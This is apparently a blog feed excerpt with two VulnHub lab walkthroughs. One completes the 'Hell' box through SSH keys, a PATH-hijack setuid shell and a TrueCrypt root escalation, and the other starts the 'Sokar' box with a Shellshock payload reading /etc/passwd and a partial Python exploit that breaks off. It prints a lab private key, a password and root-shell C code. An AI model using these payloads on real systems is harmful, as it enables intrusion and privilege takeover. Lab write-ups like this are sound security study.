</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>SSH login with password <em><font color="red">test1337</font></em></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh &lt;a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#103;&#x65;&#x6f;&#114;&#103;&#x65;&#x40;&#49;&#48;&#46;&#49;&#48;&#46;&#49;&#48;&#46;&#49;&#52;&#x36;">&#103;&#101;&#x6f;&#x72;&#x67;&#101;&#64;&#49;&#x30;&#46;&#x31;&#48;&#46;&#49;&#48;&#x2e;&#x31;&#x34;&#54;&lt;/a> -i g_id_rsa
</span><span class='line'>Enter passphrase for key &lsquo;g_id_rsa&rsquo;:
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Thu Jul 16 10:14:43 2015 from 10.10.10.131
</span><span class='line'>george@hell:~$ id
</span><span class='line'>uid=1000(george) gid=1000(george) groups=1000(george),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
</span><span class='line'>george@hell:~$ pwd
</span><span class='line'>/home/george
</span><span class='line'>george@hell:~$ ls -l
</span><span class='line'>total 4096
</span><span class='line'>-rw&mdash;&mdash;- 1 george george 4194304 Jul 12 08:30 container.tc
</span><span class='line'>george@hell:~$</span></code></pre></td></tr></table></div></figure></p>

<p>After get into the truecrypt container, I found a RSA private key file which should be someone&rsquo;s SSH key.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ truecrypt container.tc
</span><span class='line'>Enter mount directory [default]:
</span><span class='line'>Enter password for /home/george/container.tc:
</span><span class='line'>Enter keyfile [none]:
</span><span class='line'>Protect hidden volume (if any)? (y=Yes/n=No) [No]:
</span><span class='line'>george@hell:~$ df -h
</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
</span><span class='line'>udev                                                     10M     0   10M   0% /dev
</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
</span><span class='line'>/dev/mapper/truecrypt1                                  3.8M  2.0K  3.8M   1% /media/truecrypt1
</span><span class='line'>george@hell:~$ cd /media/truecrypt1
</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
</span><span class='line'>total 2
</span><span class='line'>-rwx&mdash;&mdash; 1 george george 1679 Jul  5  2014 id_rsa
</span><span class='line'>george@hell:/media/truecrypt1$ cat id_rsa
</span><span class='line'>&mdash;&ndash;BEGIN RSA PRIVATE KEY&mdash;&ndash;
</span><span class='line'>MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
</span><span class='line'>25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
</span><span class='line'>f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
</span><span class='line'>t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
</span><span class='line'>Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
</span><span class='line'>gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
</span><span class='line'>dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
</span><span class='line'>0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
</span><span class='line'>icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
</span><span class='line'>AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
</span><span class='line'>GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
</span><span class='line'>w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
</span><span class='line'>jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
</span><span class='line'>6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
</span><span class='line'>awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
</span><span class='line'>Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
</span><span class='line'>R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
</span><span class='line'>2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
</span><span class='line'>EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
</span><span class='line'>EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
</span><span class='line'>YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
</span><span class='line'>W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
</span><span class='line'>ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
</span><span class='line'>rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
</span><span class='line'>qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
</span><span class='line'>&mdash;&ndash;END RSA PRIVATE KEY&mdash;&ndash;
</span><span class='line'>george@hell:/media/truecrypt1$</span></code></pre></td></tr></table></div></figure></p>

<p>Then I download the SSH private key file to my Kali and try use it to login accounts found before.(only <strong>bazza</strong> and <strong>oj</strong> left)</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh &lt;a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#98;&#x61;&#122;&#122;&#97;&#64;&#49;&#x30;&#x2e;&#49;&#48;&#x2e;&#49;&#x30;&#x2e;&#49;&#52;&#54;">&#98;&#97;&#x7a;&#x7a;&#x61;&#x40;&#x31;&#x30;&#x2e;&#x31;&#48;&#46;&#x31;&#48;&#46;&#49;&#52;&#54;&lt;/a> -i tr_id_rsa
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Thu Jul 16 10:32:07 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) groups=1004(bazza)
</span><span class='line'>$ ls -alh &lt;br/>
</span><span class='line'>total 40K
</span><span class='line'>drwx&mdash;&mdash; 3 bazza bazza      4.0K Jul 17 08:35 .
</span><span class='line'>drwxr-xr-x 7 root  root       4.0K Jul  5  2014 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root  root        109 Jul  6  2014 barrebas.txt
</span><span class='line'>-rw&mdash;&mdash;- 1 bazza bazza       492 Jul 13 01:33 .bash_history
</span><span class='line'>-r-xr-sr-x 1 oj    developers 6.1K Jul  6  2014 part1
</span><span class='line'>-r-sr-xr-x 1 oj    oj         5.2K Jul  6  2014 part2
</span><span class='line'>drwx&mdash;&mdash; 2 bazza bazza      4.0K Jul  5  2014 .ssh
</span><span class='line'>-rw&mdash;&mdash;- 1 bazza bazza       781 Jul 13 01:42 .viminfo
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<h2>Moving to <strong>oj</strong></h2>

<p>Here we found executable program: <code>part1</code> and <code>part2</code> which has sticky bit set and owned by <strong>oj</strong>, so here should give a close check.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./part1
</span><span class='line'>Checking integrity of part2&hellip; Done!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Checking integrity of calling target&hellip; Done!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Binary and target confirmed.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Can&rsquo;t touch this &lt;em>nah na na na na naaaaaaaa nah&lt;/em>
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Here we can see that the running program has executed system command <code>id</code>. So very similar method used previously, I upload setuid.c and change it a little bit as follow and then gcc compile it to <code>/tmp/id</code>, then set environmental variable PATH to include <code>/tmp</code> at the beginning.</p>

<p><figure class='code'><figcaption><span>baz2.c  (baz2.c)</span> <a href='/downloads/code/baz2.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span> <span class="mi">1005</span> <span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/id&quot;</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gcc baz2.c -o /tmp/id
</span><span class='line'>$ ls -l /tmp
</span><span class='line'>total 8
</span><span class='line'>-rwxr-xr-x 1 bazza bazza 5028 Jul 17 08:26 id
</span><span class='line'>$ ./part1
</span><span class='line'>Checking integrity of part2&hellip; Done!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Checking integrity of calling target&hellip; Done!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Binary and target confirmed.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Can&rsquo;t touch this &lt;em>nah na na na na naaaaaaaa nah&lt;/em>
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
</span><span class='line'>oj
</span><span class='line'>$ whoami
</span><span class='line'>oj
</span><span class='line'>$ /usr/bin/id
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</span></code></pre></td></tr></table></div></figure></p>

<p>Now, I am oj. :D</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami
</span><span class='line'>oj
</span><span class='line'>$ ls -al
</span><span class='line'>total 592
</span><span class='line'>drwx&mdash;&mdash; 2 oj   oj     4096 Jul 17 23:48 .
</span><span class='line'>drwxr-xr-x 7 root root   4096 Jul  5  2014 ..
</span><span class='line'>-r-sr-xr-x 1 root root 592549 Jul  5  2014 echo
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root root    154 Jul  5  2014 How to be an infosec rockstar 101.txt
</span><span class='line'>$ ./echo AAAA-%p-%p
</span><span class='line'>AAAA-0x80488c0-0xbffffce8$
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Here I found one executable file owned by <code>root</code> under oj&rsquo;s home folder and that file has sticky bit been set which could be a way to ROOT. Also <code>echo</code> program has <a href="https://www.owasp.org/index.php/Format_string_attack">Format String vulnerability</a></p>

<h2>Getting ROOT</h2>

<p>After suffering a lot of hours painful to deal with Format String exploit about <code>echo</code>. I still could not make it work for me :`(</p>

<p>However, there is another way to privilege escape to ROOT, which has been demostrated by <a href="http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/">vincius777</a></p>

<p><figure class='code'><figcaption><span>getroot2.c  (getroot2.c)</span> <a href='/downloads/code/getroot2.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ df -h
</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
</span><span class='line'>udev                                                     10M     0   10M   0% /dev
</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
</span><span class='line'>/dev/mapper/truecrypt1                                  1.8M   26K  1.7M   2% /media/truecrypt1
</span><span class='line'>george@hell:~$ cd /media/truecrypt1
</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
</span><span class='line'>total 18
</span><span class='line'>-rwsrwxrwx 1 root root   152 Jul 17 17:13 getroot
</span><span class='line'>-rwsrwxrwx 1 root root  4970 Jul 17 17:14 getroot2
</span><span class='line'>drwx&mdash;&mdash; 2 root root 12288 Jul 17 17:09 lost+found
</span><span class='line'>george@hell:/media/truecrypt1$ ./getroot2&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=0(root) gid=1000(george) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(george)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>pwd&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>/media/truecrypt1&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>whoami&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat /root/flag.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Congratulations of beating Hell.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Sokar: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1/"/>
    <updated>2015-07-07T02:41:59-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1</id>
    <content type="html"><![CDATA[<p>Sokar is created by <a href="http://rastamouse.me/">Rasta Mouse</a> and it also is the first competition in 2015 run by VulnHub team.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sokar-1,113/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Sokar (<em>10.10.10.145/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Shellshock (Bash bug) give attacker a way to break in and also get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Shellshock vulnerability detect and check [<font color="FF8000">wget</font>]</li>
<li>Analysis and write script to exploit shellshock bug</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get reverse shell</li>
<li>Exploit shellshock bug to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.gnu.org/software/wget/">wget</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.145 in this case).</p>

<p><img class="left" src="/downloads/Sokar1/1.png"></p>

<p>10.10.10.145 is our Target!</p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, found apache 2.2.15 is running on port 591 and the target OS is CentOS Linux.</p>

<p><code>nmap -sV -v -O -A -T5 -p- 10.10.10.145</code></p>

<p><img class="left" src="/downloads/Sokar1/2.png"></p>

<p>Then I open iceweasel browser to have a close look at port 591.</p>

<p><img class="left" src="/downloads/Sokar1/3.png"></p>

<p>From the content displayed, we know the server is running system command: <code>netstat</code> and <code>iostat</code></p>

<p>From the source code, we found an URL: <code>http://10.10.10.145:591/cgi-bin/cat</code></p>

<h3>It&rsquo;s time to try shellshock (bash bug)</h3>

<p>After googled <code>shellshock</code>, I found some topics talking about how to test/exploit shellshock vulnerability in CGI. The following command is picked from <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">one</a> of them.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U &ldquo;() { test;};echo \"Content-type: text/plain\&rdquo;; echo; echo; /bin/cat /etc/passwd" &lt;a href="http://10.10.10.145:591/cgi-bin/cat">http://10.10.10.145:591/cgi-bin/cat&lt;/a> -O /temp.txt</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/Sokar1/4.png"></p>

<p>It works! shellshock vulnerable. Also, two users found: <code>bynarr</code> and <code>apophis</code></p>

<p>Here I wrote a small python script to save my life.</p>

<p><figure class='code'><figcaption><span>sokar.py  (sokar.py)</span> <a href='/downloads/code/sokar.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">str_usage</span> <span class="o">=</span> <span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> &lt;command&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="n">str_example</span> <span class="o">=</span> <span class="s">&quot;Example: </span><span class="si">%s</span><span class="s"> </span><span class="se">\&quot;</span><span class="s">/bin/cat /etc/passwd</span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.145&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">591</span>
</span><span class='line'><span class="n">uri</span> <span class="o">=</span> <span class="s">&quot;/cgi-bin/cat&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">):</span>
</span><span class='line'>	<span class="k">print</span> <span class="n">str_usage</span>
</span><span class='line'>	<span class="k">print</span> <span class="n">str_example</span>
</span><span class='line'>	<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
